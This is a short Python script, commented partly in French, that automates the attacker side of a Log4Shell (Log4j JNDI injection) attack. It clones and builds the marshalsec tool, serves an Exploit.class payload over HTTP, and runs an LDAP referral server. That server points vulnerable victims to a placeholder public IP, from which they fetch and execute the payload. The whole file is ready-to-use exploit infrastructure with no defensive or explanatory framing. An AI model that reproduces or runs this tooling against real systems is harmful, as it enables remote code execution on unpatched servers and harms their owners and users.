import subprocess
import os
import shutil
import http.server
import socketserver
import threading

# Configuration
REPO_URL = "https://github.com/mbechler/marshalsec.git"
LOCAL_DIR = "marshalsec"
EXPLOIT_HTTP_PORT = 8000
LDAP_HOST_IP = "YOUR_PUBLIC_IP"  # Remplace par ton IP publique (celle utilis√©e dans la payload Log4Shell)
EXPLOIT_CLASS_DIR = "exploit_payload"  # Dossier contenant Exploit.class

def clone_and_build_marshalsec():
    if not os.path.exists(LOCAL_DIR):
        print("[+] Cloning marshalsec repository...")
        subprocess.run(["git", "clone", REPO_URL], check=True)
    else:
        print("[*] marshalsec repo already cloned")

    print("[+] Building marshalsec with Maven...")
    subprocess.run(["mvn", "clean", "package", "-DskipTests"], cwd=LOCAL_DIR, check=True)

def run_http_server():
    os.chdir(EXPLOIT_CLASS_DIR)
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", EXPLOIT_HTTP_PORT), handler)
    print(f"[+] HTTP server serving payload at http://0.0.0.0:{EXPLOIT_HTTP_PORT}/")
    httpd.serve_forever()

def run_ldap_server():
    jar_path = os.path.join(LOCAL_DIR, "target", "marshalsec-0.0.3-SNAPSHOT-all.jar")
    if not os.path.exists(jar_path):
        raise FileNotFoundError(f"[-] JAR not found: {jar_path}")
    
    print("[+] Starting LDAP server...")
    cmd = [
        "java", "-cp", jar_path,
        "marshalsec.jndi.LDAPRefServer",
        f"http://{LDAP_HOST_IP}:{EXPLOIT_HTTP_PORT}/#Exploit"
    ]
    subprocess.run(cmd)

def main():
    clone_and_build_marshalsec()

    print("[+] Starting HTTP server for payload...")
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()

    print("[+] Starting LDAP server (will block)...")
    run_ldap_server()

if __name__ == "__main__":
    main()